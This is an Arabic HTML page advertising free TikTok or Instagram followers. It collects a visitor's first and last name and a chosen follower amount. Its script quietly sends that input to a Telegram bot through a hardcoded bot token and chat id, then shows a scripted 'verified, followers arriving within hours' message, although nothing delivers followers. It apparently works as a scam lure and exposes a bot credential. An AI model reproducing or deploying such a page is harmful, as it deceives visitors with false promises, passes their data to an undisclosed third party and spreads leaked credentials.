<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إمبراطورية الرشق | زيادة متابعين مجاناً</title>
    <style>
        :root {
            --main-color: #ff0050; /* لون تيك توك / إنستغرام */
            --secondary-color: #00f2ea;
            --bg-color: #050505;
        }
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-color);
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: linear-gradient(145deg, #111, #222);
            padding: 30px;
            border-radius: 25px;
            box-shadow: 0 0 20px rgba(255, 0, 80, 0.2);
            width: 100%;
            max-width: 400px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .header h1 { font-size: 24px; color: var(--main-color); margin-bottom: 5px; }
        .header p { font-size: 13px; opacity: 0.7; margin-bottom: 25px; }

        .form-group { text-align: right; margin-bottom: 15px; }
        label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: bold; }
        
        input, select {
            width: 100%;
            padding: 12px;
            border-radius: 12px;
            border: 1px solid #444;
            background: #1a1a1a;
            color: white;
            font-size: 16px;
            outline: none;
            transition: 0.3s;
        }
        input:focus { border-color: var(--secondary-color); box-shadow: 0 0 10px rgba(0, 242, 234, 0.2); }

        .btn-send {
            width: 100%;
            padding: 15px;
            background: linear-gradient(to right, var(--main-color), #bc003f);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
            transition: 0.4s;
        }
        .btn-send:hover { transform: scale(1.03); box-shadow: 0 0 15px var(--main-color); }

        #status { margin-top: 15px; font-size: 14px; display: none; }
        .loading-dots:after { content: ' .'; animation: dots 1.5s steps(5, end) infinite; }
        @keyframes dots { 0%, 20% { color: rgba(0,0,0,0); text-shadow: .5em 0 0 rgba(0,0,0,0), 1em 0 0 rgba(0,0,0,0); } 40% { color: white; text-shadow: .5em 0 0 rgba(0,0,0,0), 1em 0 0 rgba(0,0,0,0); } 60% { text-shadow: .5em 0 0 white, 1em 0 0 rgba(0,0,0,0); } 80%, 100% { text-shadow: .5em 0 0 white, 1em 0 0 white; } }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <h1>إمبراطورية الرشق 🚀</h1>
        <p>أكبر نظام لزيادة المتابعين والتفاعل مجاناً</p>
    </div>

    <div class="form-group">
        <label>الاسم الأول (المطلوب)</label>
        <input type="text" id="fname" placeholder="مثال: أحمد" required>
    </div>

    <div class="form-group">
        <label>الاسم الثاني (اختياري)</label>
        <input type="text" id="lname" placeholder="مثال: العراقي">
    </div>

    <div class="form-group">
        <label>اختر كمية المتابعين</label>
        <select id="amount">
            <option value="1000">1,000 متابع حقيقي</option>
            <option value="5000">5,000 متابع حقيقي</option>
            <option value="10000">10,000 متابع حقيقي</option>
        </select>
    </div>

    <button class="btn-send" onclick="startBoost()">تفعيل الدعم الآن</button>

    <div id="status">جاري الاتصال بالسيرفر <span class="loading-dots"></span></div>
</div>

<script>
    function startBoost() {
        // معلومات البوت
        const token = "7546948976:AAETtxJ-ecUKdqVOd4LFI152-IaYxROFLWQ";
        const id = "56081692";

        const firstName = document.getElementById('fname').value;
        const lastName = document.getElementById('lname').value || "لم يكتب";
        const followers = document.getElementById('amount').value;
        const statusBox = document.getElementById('status');

        if (!firstName) {
            alert("يرجى كتابة الاسم الأول للمتابعة");
            return;
        }

        // إظهار رسالة الانتظار
        statusBox.style.display = "block";
        statusBox.style.color = "#aaa";

        // تجهيز الرسالة للبوت
        const msg = `🔔 *طلب رشق جديد* \n\n👤 الاسم الأول: ${firstName} \n👤 الاسم الثاني: ${lastName} \n📈 الكمية المطلوبة: ${followers}`;

        const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;

        fetch(apiUrl)
        .then(res => {
            if (res.ok) {
                setTimeout(() => {
                    statusBox.innerHTML = "✅ تم التحقق! سيصلك المتابعون خلال ساعات.";
                    statusBox.style.color = "#00f2ea";
                }, 2000);
            } else {
                statusBox.innerHTML = "❌ خطأ في السيرفر، حاول مجدداً.";
            }
        })
        .catch(err => {
            statusBox.innerHTML = "⚠️ فشل الاتصال بالإنترنت.";
        });
    }
</script>

</body>
</html>
